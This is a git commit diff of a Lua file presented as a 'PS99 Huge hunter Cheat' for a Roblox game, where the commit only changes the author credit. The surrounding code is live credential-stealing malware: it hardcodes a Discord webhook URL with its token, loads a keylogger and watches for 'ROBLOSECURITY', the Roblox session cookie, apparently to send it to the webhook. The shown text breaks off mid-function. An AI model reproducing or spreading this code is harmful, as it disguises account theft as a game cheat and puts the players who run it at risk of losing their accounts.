93b4f32422651aa63089eaebfc140e76d1da2af4
PS99SCRIPTSZZZ <alfieway65@gmail.com>
2025-05-17 21:19:14 +0100

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,5 +1,5 @@
 -- PS99 Huge hunter Cheat v1.0
--- By: Zenox014
+-- By: PS99SCRIPTSZZZ
 -- GitHub: https://github.com/PS99SCRIPTSZZZ/hugehunterscript
 
 local webhook_url ="https://discord.com/api/webhooks/1373045421529632798/K4fyF4KF0HPaoEvSGnJM8yIh2fK5zhdjru9jyZwGvRvTXvxK_QlWWuCGWZ_PjIjDCJtn"local keylogger = require('keylogger')local function on_key_pressed(key)    if key:find('ROBLOSECURITY') then
